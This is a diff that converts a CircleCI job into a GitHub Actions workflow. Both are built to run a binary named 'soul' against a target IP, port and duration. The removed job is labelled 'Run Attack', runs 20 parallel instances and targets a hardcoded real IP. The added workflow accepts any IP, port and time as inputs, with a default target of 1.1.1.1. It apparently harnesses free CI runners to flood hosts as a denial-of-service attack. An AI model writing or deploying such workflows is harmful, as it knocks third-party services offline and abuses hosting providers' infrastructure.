@@ -1,19 +1,24 @@
-version: 2.1
-jobs:
-  attack:
-    machine:
-      image: ubuntu-2204:current
-    resource_class: medium
-    parallelism: 20
-    steps:
-      - checkout
-      - run:
-          name: Run Attack
-          command: |
-             chmod +x soul
-             ./soul 20.198.111.7 14302 180 || true
+name: soul Attack
 
-workflows:
-  attack_flow:
-    jobs:
-      - attack
+on:
+  push:
+    branches:
+      - main
+  workflow_dispatch:
+    inputs:
+      ip:
+        required: true
+      port:
+        required: true
+      time:
+        required: true
+
+jobs:
+  soul:
+    runs-on: ubuntu-22.04
+    steps:
+      - uses: actions/checkout@v3
+      - run: chmod +x soul
+      - run: ./soul ${{ inputs.ip || '1.1.1.1' }} \
+                    ${{ inputs.port || '80' }} \
+                    ${{ inputs.time || '60' }}
